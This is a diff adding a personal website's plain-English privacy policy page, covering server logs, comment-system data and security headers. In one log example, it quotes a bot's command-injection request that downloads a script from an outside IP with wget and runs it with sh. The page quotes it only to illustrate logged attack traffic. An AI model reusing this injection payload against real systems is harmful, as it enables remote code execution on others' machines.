@@ -1,0 +1,49 @@
+<!doctype html>
+
+<html>
+    <head>
+        <title>privacy policy</title>
+    </head>
+
+    <body>
+        <h1>i think i'm legally obligated to provide this</h1>
+        <h4>also, i think its semi cool to provide one in plain english</h4>
+
+        <h2>what do i store?</h2>
+        <p> 
+            <ul>
+                <li>Like all webservers, nginx (my web server of choice) will store logs of people accessing the site, it includes barely anything - things I can imagine lawyers caring about:
+                    <ul>
+                        <li>IP address (a number that tells the server where to reply to, which is where your computer will be listening)</li>
+                        <li>Web browser user agent (this tells the server which browswer and which version you are using, typically for compatibility settings</li>
+                        <li>HTTP referer [not sic] (this is a lot of the times empty, but will say which website you came from)</li>
+                        <li>Here's an example of what's stored per access (this is someone trying to hack my site using a bot): <code>47.97.6.155 - - [26/Sep/2018:09:39:03 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://217.61.6.127/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27$ HTTP/1.1" 400 166 "-" "Hello, World"</code></li>
+                    </ul>
+                </li>
+
+                <li>My commenting system (if it's running) is custom written. One of the things I do to try and reduce spam is implement a captcha, which requires a user to submit them solving a problem (for me it's image recognition). In order to ensure that people don't try in rapid succession, I store the source IP address to limit this. It <em>probably</em> will be cleared every so often. I suppose another thing that is stored by my comment system is user comments (surprise, surprise!). I think I store the IP addresses, and email permanently alongside each comment made indefinitely tho, as promised, the emails are not published, but are optional, if you want me to email you in the future</li>
+            </ul>
+        </p>
+
+        <h2>do you do anything else?</h2>
+        <p>
+        To be a nice netizen, I set some policies on my website to ensure that you're not at risk of malicious attacks, via (attempting to) program with security in mind, and enabling restrictive policies on my website (e.g. not allowing foreign javascript to be executed). I set this via some HTTP security headers - CSP, X-XSS-Protection. I went a bit overboard, there's not really anything secret stored on this server (or at least there wasn't any at the time of writing this, September 2018).
+        </p>
+
+        <p>
+        In addition, I set up my Referer Policy, which will ensure that if you navigate away from my site, they will NOT know that you came from my site (which unfortunately is the default). I try and be as secure and privacy conscious as possible, which is why I avoid Google shit, such as their CDN and their analytics, but ESPECIALLY their advertisements. Fuck you Google.
+        </p>
+
+        <h2>stay cool</h2>
+        <p>
+        It's a dangerous world out there. Fight for your net rights, install an adblocker (recommended: ublock origin), Privacy Badger, NoScript (if you're really brave, but don't forget to whitelist this site!), aaaand <a href="https://www.eff.org/wp/effs-top-12-ways-protect-your-online-privacy">follow this guide!</a>
+        </p>
+
+        <p>
+        If you see a site that doesn't have a privacy policy, nudge for them to include one! (:
+        </p>
+
+        Much love,
+        Patrick Nappa
+    </body>
+
